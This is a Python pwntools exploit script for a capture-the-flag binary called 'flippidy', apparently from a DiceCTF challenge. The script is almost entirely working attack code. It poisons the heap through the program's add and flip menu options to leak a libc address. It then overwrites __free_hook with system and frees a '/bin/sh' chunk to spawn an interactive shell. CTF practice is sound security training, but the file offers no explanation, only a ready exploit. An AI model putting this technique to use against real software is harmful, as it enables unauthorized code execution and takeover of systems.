#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'dicec.tf', 31904
binary = './flippidy'
brkpts = '''
'''

elf = ELF("flippidy")
libc = ELF("libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def init(size):
    sla("be: ",str(size))

def add(idx,data):
    sla(": ",'1')
    sla("Index: ",str(idx))
    sla("Content: ",data)

def flip():
    sla(": ",'2')
    
if __name__ == "__main__":
    init(3)
    add(0, "/bin/sh\x00")
    add(1, p64(0x404020))
    add(2, "/bin/sh\x00")
    flip()
    add(1,(p64(0x404040)+p64(0x404120)*3+p64(0x404040)))
    for i in range(4):
        io.recvline()
    libc.address = u64(re(6).ljust(8, "\x00")) - 0x3ec760
    log.info("Libc -> "+hex(libc.address))

    free_hook = libc.symbols['__free_hook']
    log.info("Free hook -> "+hex(free_hook))
    system = libc.symbols['system']

    add(1,p64(free_hook))
    add(1,p64(free_hook))
    #gdb.attach(io)
    add(1, p64(system))

    flip()

    io.interactive()

